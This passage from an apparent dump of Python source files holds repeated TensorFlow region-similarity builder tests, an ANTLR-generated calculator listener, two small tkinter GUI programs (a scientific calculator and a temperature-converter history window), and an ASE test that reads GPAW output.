NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "188": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "189": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "190": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "191": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "192": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "193": "# Generated from C:/Users/Alex/PycharmProjects/PersonalProject/src/antlr\\Calc.g4 by ANTLR 4.9.2\nfrom antlr4 import *\nif __name__ is not None and \".\" in __name__:\n    from .CalcParser import CalcParser\nelse:\n    from CalcParser import CalcParser\n\n# This class defines a complete listener for a parse tree produced by CalcParser.\nclass CalcListener(ParseTreeListener):\n\n    # Enter a parse tree produced by CalcParser#parse.\n    def enterParse(self, ctx:CalcParser.ParseContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#parse.\n    def exitParse(self, ctx:CalcParser.ParseContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#EquationExpression.\n    def enterEquationExpression(self, ctx:CalcParser.EquationExpressionContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#EquationExpression.\n    def exitEquationExpression(self, ctx:CalcParser.EquationExpressionContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#assignment.\n    def enterAssignment(self, ctx:CalcParser.AssignmentContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#assignment.\n    def exitAssignment(self, ctx:CalcParser.AssignmentContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#comment.\n    def enterComment(self, ctx:CalcParser.CommentContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#comment.\n    def exitComment(self, ctx:CalcParser.CommentContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#ArithmeticExpressionPow.\n    def enterArithmeticExpressionPow(self, ctx:CalcParser.ArithmeticExpressionPowContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#ArithmeticExpressionPow.\n    def exitArithmeticExpressionPow(self, ctx:CalcParser.ArithmeticExpressionPowContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#ArithmeticExpressionParens.\n    def enterArithmeticExpressionParens(self, ctx:CalcParser.ArithmeticExpressionParensContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#ArithmeticExpressionParens.\n    def exitArithmeticExpressionParens(self, ctx:CalcParser.ArithmeticExpressionParensContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#ArithmeticExpressionNumericEntity.\n    def enterArithmeticExpressionNumericEntity(self, ctx:CalcParser.ArithmeticExpressionNumericEntityContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#ArithmeticExpressionNumericEntity.\n    def exitArithmeticExpressionNumericEntity(self, ctx:CalcParser.ArithmeticExpressionNumericEntityContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#ArithmeticExpressionMultDiv.\n    def enterArithmeticExpressionMultDiv(self, ctx:CalcParser.ArithmeticExpressionMultDivContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#ArithmeticExpressionMultDiv.\n    def exitArithmeticExpressionMultDiv(self, ctx:CalcParser.ArithmeticExpressionMultDivContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#ArithmeticExpressionPlusMinus.\n    def enterArithmeticExpressionPlusMinus(self, ctx:CalcParser.ArithmeticExpressionPlusMinusContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#ArithmeticExpressionPlusMinus.\n    def exitArithmeticExpressionPlusMinus(self, ctx:CalcParser.ArithmeticExpressionPlusMinusContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#NumericConst.\n    def enterNumericConst(self, ctx:CalcParser.NumericConstContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#NumericConst.\n    def exitNumericConst(self, ctx:CalcParser.NumericConstContext):\n        pass\n\n\n    # Enter a parse tree produced by CalcParser#NumericVariable.\n    def enterNumericVariable(self, ctx:CalcParser.NumericVariableContext):\n        pass\n\n    # Exit a parse tree produced by CalcParser#NumericVariable.\n    def exitNumericVariable(self, ctx:CalcParser.NumericVariableContext):\n        pass\n\n\n\ndel CalcParser", "194": "import tkinter as tk\r\nimport math\r\n\r\ndef add_digit(digit):\r\n    value = calc.get()+ str(digit)\r\n    calc.delete(0, tk.END)\r\n    calc.insert(0, value)\r\n\r\ndef add_operation(operation):\r\n    value = calc.get()\r\n    if value[-1] in '-+/*%':\r\n        value = value[:-1]\r\n    elif '+' in value or '-' in value or '/' in value or '*' in value:\r\n        calculate()\r\n        value = calc.get()\r\n    calc.delete(0, tk.END)\r\n    calc.insert(0, value+operation)\r\n\r\ndef calculate():\r\n    value = calc.get()\r\n    if value[-1] in '+-*/%':\r\n        value = value+value[:-1]\r\n    calc.delete(0, tk.END)\r\n    calc.insert(0, eval(value))\r\n\r\ndef clear ():\r\n    calc.delete(0, tk.END)\r\n    calc.insert(0,' ')\r\n\r\ndef Cosinus():\r\n    value=calc.get()\r\n    x=float(value)\r\n    value=math.cos(x)\r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,value)\r\n\r\ndef Sinus():\r\n    value=calc.get()\r\n    x=float(value)\r\n    value=math.sin(x)\r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,value)\r\n\r\ndef tan():\r\n    value=calc.get()\r\n    x=float(value)\r\n    value=math.tan(x)\r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,value)\r\n\r\ndef ctg():\r\n    value=calc.get()\r\n    x=float(value)\r\n    value=math.cos(x)/math.sin(x)\r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,value)\r\n\r\ndef log():\r\n    value=calc.get()\r\n    x=float(value)\r\n    value=math.log2(x)\r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,value)\r\n\r\ndef ln():\r\n    value=calc.get()\r\n    x=float(value)\r\n    value=math.log10(x)\r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,value)\r\n\r\ndef DK():\r\n    value = calc.get()\r\n    n = ''\r\n    x=int(value)\r\n    while x > 0 :\r\n            y = str(x % 2)\r\n            n = y + n\r\n            x = int(x / 2)    \r\n    calc.delete(0,tk.END)\r\n    calc.insert(0,n)\r\n   \r\ndef operation_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial, 13'), fg='red',\r\n                     command=lambda: add_operation(operation))\r\n\r\ndef calc_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial, 13'), fg='red',\r\n                    command=calculate)\r\n\r\ndef clear_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial, 13'), fg='red',\r\n                    command=clear)\r\n\r\ndef cos_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='red',\r\n                     command=Cosinus)\r\n\r\ndef sin_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='red',\r\n                     command=Sinus)\r\n\r\ndef tan_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='red',\r\n                     command=tan)\r\n\r\ndef ctg_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='red',\r\n                     command=ctg)\r\n\r\ndef log_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='red',\r\n                     command=log)\r\n\r\ndef ln_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='red',\r\n                     command=ln)\r\n\r\ndef dkod_button(operation):\r\n    return tk.Button(text=operation, bd=5, font=('Arial,13'), fg='#008000',\r\n                     command=DK)\r\n\r\nwin = tk.Tk()\r\nwin.geometry(f\"365x280+100+200\")\r\nwin['bg']= '#D3D3D3'\r\nwin.title('\u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440')\r\n\r\ncalc = tk.Entry(win, justify=tk.RIGHT, font=('Arial', 15), width=15)\r\ncalc.grid(row=0, column=0, columnspan=6, stick='we', padx=5, pady=5)\r\n\r\ntk.Button(text='1', bd=5, font=('Arial', 13),command=lambda : add_digit(1)).grid(row=1, column=0, stick='wens', padx=5, pady=5)\r\ntk.Button(text='2', bd=5, font=('Arial', 13),command=lambda : add_digit(2)).grid(row=1, column=1, stick='wens', padx=5, pady=5)\r\ntk.Button(text='3', bd=5, font=('Arial', 13),command=lambda : add_digit(3)).grid(row=1, column=2, stick='wens', padx=5, pady=5)\r\ntk.Button(text='4', bd=5, font=('Arial', 13),command=lambda : add_digit(4)).grid(row=2, column=0, stick='wens', padx=5, pady=5)\r\ntk.Button(text='5', bd=5, font=('Arial', 13),command=lambda : add_digit(5)).grid(row=2, column=1, stick='wens', padx=5, pady=5)\r\ntk.Button(text='6', bd=5, font=('Arial', 13),command=lambda : add_digit(6)).grid(row=2, column=2, stick='wens', padx=5, pady=5)\r\ntk.Button(text='7', bd=5, font=('Arial', 13),command=lambda : add_digit(7)).grid(row=3, column=0, stick='wens', padx=5, pady=5)\r\ntk.Button(text='8', bd=5, font=('Arial', 13),command=lambda : add_digit(8)).grid(row=3, column=1, stick='wens', padx=5, pady=5)\r\ntk.Button(text='9', bd=5, font=('Arial', 13),command=lambda : add_digit(9)).grid(row=3, column=2, stick='wens', padx=5, pady=5)\r\ntk.Button(text='0', bd=5, font=('Arial', 13),command=lambda : add_digit(0)).grid(row=4, column=0, stick='wens', padx=5, pady=5)\r\n\r\noperation_button('+').grid(row=1, column=3, stick='wens', padx=5, pady=5)\r\noperation_button('-').grid(row=2, column=3, stick='wens', padx=5, pady=5)\r\noperation_button('/').grid(row=3, column=3, stick='wens', padx=5, pady=5)\r\noperation_button('*').grid(row=4, column=3, stick='wens', padx=5, pady=5)\r\noperation_button('%').grid(row=3, column=5, stick='wens', padx=5, pady=5)\r\n\r\ncos_button('cos').grid(row=1, column=4, stick='wens', padx=5, pady=5)\r\nsin_button('sin').grid(row=2, column=4, stick='wens', padx=5, pady=5)\r\ntan_button('tan').grid(row=3, column=4, stick='wens', padx=5, pady=5)\r\nctg_button('ctg').grid(row=4, column=4, stick='wens', padx=5, pady=5)\r\nlog_button('log').grid(row=1, column=5, stick='wens', padx=5, pady=5)\r\nln_button('ln').grid(row=2, column=5, stick='wens', padx=5, pady=5)\r\ndkod_button('DK').grid(row=4, column=5, stick='wens', padx=5, pady=5)\r\n\r\n\r\ncalc_button('=').grid(row=4, column=2, stick='wens', padx=5, pady=5)\r\nclear_button('C').grid(row=4, column=1, stick='wens', padx=5, pady=5)\r\n\r\n\r\nwin.grid_columnconfigure(0,minsize=60)\r\nwin.grid_columnconfigure(1,minsize=60)\r\nwin.grid_columnconfigure(2,minsize=60)\r\nwin.grid_columnconfigure(3,minsize=60)\r\n\r\nwin.grid_rowconfigure(1,minsize=60)\r\nwin.grid_rowconfigure(2,minsize=60)\r\nwin.grid_rowconfigure(3,minsize=60)\r\nwin.grid_rowconfigure(4,minsize=60)\r\n", "195": "from ase.calculators.singlepoint import SinglePointDFTCalculator\n\n\ndef test_read_gpaw_out(datadir):\n    \"\"\"Test reading of gpaw text output\"\"\"\n    from ase import io\n\n    # read input\n\n    output_file_name = datadir / 'gpaw_expected_text_output'\n    atoms = io.read(output_file_name)\n\n    # test calculator\n\n    calc = atoms.calc\n    assert isinstance(calc, SinglePointDFTCalculator)\n    assert calc.name == 'vdwtkatchenko09prl'\n    assert calc.parameters['calculator'] == 'gpaw'\n\n    for contribution in [\n            'kinetic', 'potential', 'external', 'xc',\n            'entropy (-st)', 'local']:\n        assert contribution in calc.energy_contributions\n\n\n# for the record, include somehow XXX\n# output in datadir / 'gpaw_expected_text_output' written by\n\"\"\"\nif 1:\n    from ase.build import molecule\n    from ase.calculators.vdwcorrection import vdWTkatchenko09prl\n\n    from gpaw import GPAW, FermiDirac\n    from gpaw.cluster import Cluster\n    from gpaw.analyse.vdwradii import vdWradii\n    from gpaw.analyse.hirshfeld import HirshfeldDensity, HirshfeldPartitioning\n\n    atoms = Cluster(molecule('H2'))\n    atoms.minimal_box(3)\n\n    calc = GPAW(xc='PBE', occupations=FermiDirac(0.1))\n    atoms.calc = vdWTkatchenko09prl(\n        HirshfeldPartitioning(calc),\n        vdWradii(atoms.get_chemical_symbols(), 'PBE'))\n    atoms.get_potential_energy()\n\"\"\"\n", "196": "# Started with 09_History_GUI_v5\nfrom tkinter import *\nfrom functools import partial  # To prevent unwanted windows\nimport re\n\n\nclass Converter:\n    def __init__(self):\n\n        # formatting variables\n        background_colour = \"light blue\"\n\n        # Initialise list to hold calculation history\n        # In later versions list will be populated with user calculations\n        self.all_calc_list = [\"0 degrees F is -17.8 degrees C\",\n                              \"0 degrees C is 32 degrees F\",\n                              \"100 degrees F is 37.8 degrees C\"]\n        # self_all_calc_list = []\n\n        # Converter Main Screen GUI\n        self.converter_frame = Frame(width=300, height=300,\n                                     bg=background_colour, pady=10)\n        self.converter_frame.grid()\n\n        # Temperature Conversion Heading (row 0)\n        self.temp_converter_label = Label(self.converter_frame,\n                                          text=\"Temperature Converter\",\n                                          font=(\"Arial\", \"16\", \"bold\"),\n                                          bg=background_colour,\n                                          padx=10, pady=10)\n        self.temp_converter_label.grid(row=0)\n\n        # history Button (row 1)\n        self.history_button = Button(self.converter_frame, text=\"History\",\n                                     font=(\"Arial\", \"14\"), padx=10, pady=10,\n                                     command=lambda: self.history\n                                     (self.all_calc_list))\n        self.history_button.grid(row=1)\n\n        if len(self.all_calc_list) == 0:\n            self.history_button.config(state=DISABLED)\n\n    def history(self, calc_history):\n        History(self, calc_history)\n\n\nclass History:\n    def __init__(self, partner, calc_history):\n        background = \"#f5e7b5\"  # beige\n\n        # disable history button\n        partner.history_button.config(state=DISABLED)\n\n        # sets up child window (ie. history box)\n        self.history_box = Toplevel()\n\n        # if cross pressed, closes history and 'releases' history button\n        self.history_box.protocol('WM_DELETE_WINDOW',\n                                  partial(self.close_history, partner))\n\n        # set up GUI frame\n        self.history_frame = Frame(self.history_box, width=300, bg=background)\n        self.history_frame.grid()\n\n        # set up history heading (row 0)\n        self.hist_heading = Label(self.history_frame, text=\"Calculate History\",\n                                  font=\"Arial 18 bold\", bg=background)\n        self.hist_heading.grid(row=0)\n\n        # history text (label, row 1)\n        self.history_text = Label(self.history_frame,\n                                  text=\"Here are your most recent \"\n                                       \"calculations. Please use the export \"\n                                       \"button to create a text file of all \"\n                                       \"your calculations for this session\",\n                                  font=\"Arial 10 italic\", wrap=250,\n                                  justify=LEFT, width=40, bg=background,\n                                  padx=10, pady=10)\n        self.history_text.grid(row=1)\n\n        # History output goes here (row 2)\n        history_string = \"\"\n        if len(calc_history) >= 7:\n            for item in range(0, 7):\n                history_string += calc_history[len(calc_history)-item-1]+\"\\n\"\n\n        else:\n            for item in calc_history:\n                history_string += calc_history[len(calc_history) -\n                                               calc_history.index(item)-1]+\"\\n\"\n                self.history_text.config(text=\"Here is your calculation \"\n                                              \"history. You can use the \"\n                                              \"export button to save this \"\n                                              \"data to a text file if desired\")\n        # Label to display calculation history to user\n        self.calc_label = Label(self.history_frame, text=history_string,\n                                bg=background, font=\"Arial 12\", justify=LEFT)\n        self.calc_label.grid(row=2)\n\n        # Export / Dismiss button frame\n        self.export_dismiss_frame = Frame(self.history_frame)\n        self.export_dismiss_frame.grid(row=3, pady=10)\n\n        # Export Button\n        self.export_button = Button(self.export_dismiss_frame, text=\"Export\",\n                                    font=\"Arial 12 bold\",\n                                    command=lambda: self.export(calc_history))\n        self.export_button.grid(row=0, column=0)\n\n        # Dismiss Button\n        self.dismiss_btn = Button(self.export_dismiss_frame, text=\"Dismiss\",\n                                  font=\"Arial 12 bold\",\n                                  command=partial(self.close_history, partner))\n        self.dismiss_btn.grid(row=0, column=1)\n\n    def close_history(self, partner):\n        # Put history button back to normal...\n        partner.history_button.config(state=NORMAL)\n        self.history_box.destroy()\n\n    def export(self, calc_history):\n        Export(self, calc_history)\n\n\nclass Export:\n    def __init__(self, partner, calc_history):\n        print(calc_history)  # for testing purposes\n\n        background = \"#f5e7b5\"  # beige\n\n        # disable export button\n        partner.export_button.config(state=DISABLED)\n\n        # sets up child window (ie. export box)\n        self.export_box = Toplevel()\n\n        # if cross pressed, closes export and 'releases' export button\n        self.export_box.protocol('WM_DELETE_WINDOW', partial(self.close_export,\n                                                             partner))\n\n        # set up GUI frame\n        self.export_frame = Frame(self.export_box, width=300, bg=background)\n        self.export_frame.grid()\n\n        # set up export heading (row 0)\n        self.export_heading = Label(self.export_frame,\n                                    text=\"Export instructions\",\n                                    font=\"Arial 10 bold\", bg=background)\n        self.export_heading.grid(row=0)\n\n        # Export text (label, row 1)\n        self.export_text = Label(self.export_frame,\n                                 text=\"Enter a filename in the box below and \"\n                                      \"press the Save button to save your \"\n                                      \"calculation history to a text file.\",\n                                 justify=CENTER, width=40, bg=background,\n                                 wrap=250)\n        self.export_text.grid(row=1)\n\n        # Warning text (label, row 2)\n        self.export_text = Label(self.export_frame,\n                                 text=\"If the filename you enter below \"\n                                      \"already exists, it's contents will be \"\n                                      \"replaced with your calculation history\",\n                                 justify=LEFT, bg=\"#ebc091\",  # orange\n                                 font=\"Arial 10 italic\", fg=\"maroon\",\n                                 wrap=225, padx=10, pady=5)\n        self.export_text.grid(row=2, pady=10)\n\n        # Filename entry box (row 3)\n        self.filename_entry = Entry(self.export_frame, width=20,\n                                    font=\"Arial 14 bold\", justify=CENTER)\n        self.filename_entry.grid(row=3)\n\n        # Error Message labels (row 4)\n        self.save_error_label = Label(self.export_frame, text=\"\", fg=\"maroon\",\n                                      bg=background)\n        self.save_error_label.grid(row=4)\n\n        # Save / Cancel Frame (row 4)\n        self.save_cancel_frame = Frame(self.export_frame)\n        self.save_cancel_frame.grid(row=5, pady=10)\n\n        # Save and Cancel Button (row 0 of save_cancel_frame)\n        self.save_button = Button(self.save_cancel_frame, text=\"Save\",\n                                  command=partial(lambda: self.save_history\n                                  (partner, calc_history)))\n        self.save_button.grid(row=0, column=0)\n\n        self.cancel_button = Button(self.save_cancel_frame, text=\"Cancel\",\n                                    command=partial(self.close_export,\n                                                    partner))\n        self.cancel_button.grid(row=0, column=1)\n\n    def save_history(self, partner, calc_history):\n        # Regular Expression to check filename can be upper or lower case\n        # letters, numbers or underscore\n        valid_char = \"[A-Za-z0-9_]\"\n        has_error = \"no\"\n\n        filename = self.filename_entry.get()\n        print(filename)\n\n        for letter in filename:\n            if re.match(valid_char, letter):\n                continue  # If the letter is valid, goes back and checks next\n\n            elif letter == \" \":  # Otherwise, find problem\n                error_type = \"(no spaces allowed)\"\n            else:\n                error_type = f\"(no {letter}'s allowed)\"\n            has_error = \"yes\"\n\n        if filename == \"\":\n            error_type = \"can't be blank\"\n           